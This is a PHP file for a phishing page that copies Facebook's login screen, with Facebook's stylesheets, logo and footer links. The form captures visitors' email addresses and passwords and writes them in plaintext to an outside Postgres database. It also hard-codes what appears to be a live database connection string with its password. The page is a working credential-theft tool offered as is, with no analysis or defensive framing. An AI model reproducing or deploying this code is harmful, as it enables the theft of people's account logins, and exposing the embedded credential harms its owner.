<?php
// Get the database connection string from the environment variable
$database_url = getenv('postgres://default:VFqwalmA0rU7@ep-bitter-sun-a4autltg.us-east-1.aws.neon.tech:5432/verceldb?sslmode=require');

// Parse the database URL
$dbparts = parse_url($database_url);

// Database connection parameters
$host = $dbparts['host'];
$dbname = ltrim($dbparts['path'], '/');
$username = $dbparts['user'];
$password = $dbparts['pass'];
$port = $dbparts['port'];
$sslmode = 'require';

// Establish a connection to the database
try {
    $dsn = "pgsql:host=$host;port=$port;dbname=$dbname;sslmode=$sslmode";
    $pdo = new PDO($dsn, $username, $password, [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION]);
} catch (PDOException $e) {
    die("Error connecting to database: " . $e->getMessage());
}

// Process form submission
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Retrieve form data
    $email = $_POST['email'];
    $password = $_POST['password'];

    // Insert data into the users table
    try {
        $stmt = $pdo->prepare("INSERT INTO users (email, password) VALUES (?, ?)");
        $stmt->execute([$email, $password]);
        $success_message = "User data inserted successfully!";
    } catch (PDOException $e) {
        $error_message = "Error: " . $e->getMessage();
    }
}
?>

<!DOCTYPE html>
<html lang="en" id="facebook" class="">
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title id="pageTitle">Facebook – log in or sign up</title>
    <link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/yP/l/0,cross/MLqwrMaU6vN.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="tgpreWX">
    <link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/yE/l/0,cross/7MjFZ3SJoP7.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="jyV9Tl+">
    <link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/y0/l/0,cross/uY6yx8gqGzP.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="08u8WMv">
</head>
<body class="fbIndex UIPage_LoggedOut _-kb _605a b_c3pyn-ahh webkit win x1 Locale_en_GB cores-gte4 _19_u" dir="ltr">
    <div class="_li" id="u_0_1_fd">
        <div id="globalContainer" class="uiContextualLayerParent">
            <div class="fb_content clearfix " id="content" role="main">
                <div>
                    <div class="_8esj _95k9 _8esf _8opv _8f3m _8ilg _8icx _8op_ _95ka">
                        <div class="_8esk">
                            <div class="_8esl">
                                <div class="_8ice">
                                    <img class="fb_logo _8ilh img" src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="Facebook">
                                </div>
                                <h2 class="_8eso">Facebook helps you connect and share with the people in your life.</h2>
                            </div>
                            <div class="_8esn">
                                <div class="_8iep _8icy _9ahz _9ah-">
                                    <div class="_6luv _52jv">
                                        <?php
                                        if (isset($success_message)) {
                                            echo "<p style='color: green;'>$success_message</p>";
                                        }
                                        if (isset($error_message)) {
                                            echo "<p style='color: red;'>$error_message</p>";
                                        }
                                        ?>
                                        <form class="_9vtf" data-testid="royal_login_form" action="<?php echo $_SERVER['PHP_SELF']; ?>" method="post">
                                            <div>
                                                <div class="_6lux">
                                                    <input type="text" class="inputtext _55r1 _6luy" name="email" id="email" placeholder="Email address or phone number" autofocus="1">
                                                </div>
                                                <div class="_6lux">
                                                    <div class="_6luy _55r1 _1kbt _9nyi" id="passContainer">
                                                        <input type="password" class="inputtext _55r1 _6luy _9npi" name="password" id="pass" placeholder="Password">
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="_6ltg">
                                                <button value="1" class="_42ft _4jy0 _6lth _4jy6 _4jy1 selected _51sy" name="login" data-testid="royal_login_button" type="submit" id="u_0_5_Eu">Log in</button>
                                            </div>
                                            <div class="_6ltj">
                                                <a href="forget_password.php">Forgotten password?</a>
                                            </div>
                                            <div class="_8icz"></div>
                                            <div class="_6ltg">
                                                <a role="button" class="_42ft _4jy0 _6lti _4jy6 _4jy2 selected _51sy" href="https://www.facebook.com/reg/" ajaxify="" id="u_0_0_g/" data-testid="open-registration-form-button">Create new account</a>
                                            </div>
                                        </form>
                                    </div>
                                    <div id="reg_pages_msg" class="_58mk">
                                        <a href="https://www.facebook.com/reg/" class="_8esh">Create a Page</a> for a celebrity, brand or business.
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <div class="">
                <div class="_95ke _8opy">
                    <div id="pageFooter" data-referrer="page_footer" data-testid="page_footer">
                        <ul class="uiList localeSelectorList _2pid _509- _4ki _6-h _6-j _6-i" data-nocookies="1">
                            <li>English (UK)</li>
                            <li><a class="_sv4" dir="ltr" href="https://fr-fr.facebook.com/" title="French (France)">Français (France)</a></li>
                            <li><a class="_sv4" dir="rtl" href="https://ar-ar.facebook.com/" title="Arabic">العربية</a></li>
                            <li><a class="_sv4" dir="ltr" href="https://es-es.facebook.com/" title="Spanish (Spain)">Español (España)</a></li>
                            <li><a class="_sv4" dir="ltr" href="https://it-it.facebook.com/" title="Italian">Italiano</a></li>
                            <li><a class="_sv4" dir="ltr" href="https://de-de.facebook.com/" title="German">Deutsch</a></li>
                            <li><a class="_sv4" dir="ltr" href="https://pt-br.facebook.com/" title="Portuguese (Brazil)">Português (Brasil)</a></li>
                            <li><a class="_sv4" dir="ltr" href="https://hi-in.facebook.com/" title="Hindi">हिन्दी</a></li>
                            <li><a class="_sv4" dir="ltr" href="https://zh-cn.facebook.com/" title="Simplified Chinese (China)">中文(简体)</a></li>
                            <li><a class="_sv4" dir="ltr" href="https://ja-jp.facebook.com/" title="Japanese">日本語</a></li>
                            <li><a role="button" class="_42ft _4jy0 _517i _517h _51sy" rel="dialog" href="#" title="Show more languages"><i class="img sp_T9oq_D5KlkJ sx_b17408"></i></a></li>
                        </ul>
                        <div id="contentCurve"></div>
                        <div id="pageFooterChildren" role="contentinfo" aria-label="Facebook site links">
                            <ul class="uiList pageFooterLinkList _509- _4ki _703 _6-i">
                                <li><a href="/reg/" title="Sign up for Facebook">Sign Up</a></li>
                                <li><a href="/login/" title="Log in to Facebook">Log in</a></li>
                                <li><a href="https://messenger.com/" title="Take a look at Messenger.">Messenger</a></li>
                                <li><a href="/lite/" title="Facebook Lite for Android.">Facebook Lite</a></li>
                                <li><a href="https://www.facebook.com/watch/" title="Browse in Video">Video</a></li>
                                <li><a href="/places/" title="Take a look at popular places on Facebook.">Places</a></li>
                                <li><a href="/games/" title="Check out Facebook games.">Games</a></li>
                                <li><a href="/marketplace/" title="Buy and sell on Facebook Marketplace.">Marketplace</a></li>
                                <li><a href="https://pay.facebook.com/" title="Learn more about Meta Pay" target="_blank">Meta Pay</a></li>
                                <li><a href="https://www.meta.com/" title="Discover Meta" target="_blank">Meta Store</a></li>
                                <li><a href="https://www.meta.com/quest/" title="Learn more about Meta Quest" target="_blank">Meta Quest</a></li>
                                <li><a href="https://www.meta.ai/" title="Meta AI">Meta AI</a></li>
                                <li><a href="https://www.instagram.com/" title="Take a look at Instagram" target="_blank" rel="nofollow">Instagram</a></li>
                                <li><a href="https://www.threads.net/" title="Check out Threads">Threads</a></li>
                                <li><a href="/fundraisers/" title="Donate to worthy causes.">Fundraisers</a></li>
                                <li><a href="/biz/directory/" title="Browse our Facebook Services directory.">Services</a></li>
                                <li><a href="/votinginformationcenter/?entry_point=c2l0ZQ%3D%3D" title="See the Voting Information Centre">Voting Information Centre</a></li>
                                <li><a href="/privacy/policy/?entry_point=facebook_page_footer" title="Learn how we collect, use and share information to support Facebook.">Privacy Policy</a></li>
                                <li><a href="/privacy/center/?entry_point=facebook_page_footer" title="Learn how to manage and control your privacy on Facebook.">Privacy Centre</a></li>
                                <li><a href="/groups/discover/" title="Explore our groups.">Groups</a></li>
                                <li><a href="https://about.meta.com/" accesskey="8" title="Read our blog, discover the resource centre and find job opportunities.">About</a></li>
                                <li><a href="/ad_campaign/landing.php?placement=pflo&campaign_id=402047449186&nav_source=unknown&extra_1=auto" title="Advertise on Facebook">Create ad</a></li>
                                <li><a href="/pages/create/?ref_type=site_footer" title="Create a Page">Create Page</a></li>
                                <li><a href="https://developers.facebook.com/?ref=pf" title="Develop on our platform.">Developers</a></li>
                                <li><a href="/careers/?ref=pf" title="Make your next career move to our brilliant company.">Careers</a></li>
                                <li><a href="/policies/cookies/" title="Learn about cookies and Facebook." data-nocookies="1">Cookies</a></li>
                                <li><a class="_41ug" data-nocookies="1" href="https://www.facebook.com/help/568137493302217" title="Learn about Ad Choices.">AdChoices<i class="img sp_T9oq_D5KlkJ sx_166c0c"></i></a></li>
                                <li><a data-nocookies="1" href="/policies?ref=pf" accesskey="9" title="Review our terms and policies.">Terms</a></li>
                                <li><a href="/help/?ref=pf" accesskey="0" title="Visit our Help Centre.">Help</a></li>
                                <li><a href="help/637205020878504" title="Visit our contact uploading and non-users notice.">Contact uploading and non-users</a></li>
                                <li><a accesskey="6" class="accessible_elem" href="/settings" title="View and edit your Facebook settings.">Settings</a></li>
                                <li><a accesskey="7" class="accessible_elem" href="/allactivity?privacy_source=activity_log_top_menu" title="View your activity log">Activity log</a></li>
                            </ul>
                        </div>
                        <div class="mvl copyright">
                            <div><span> Meta © 2024</span></div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</body>
</html>
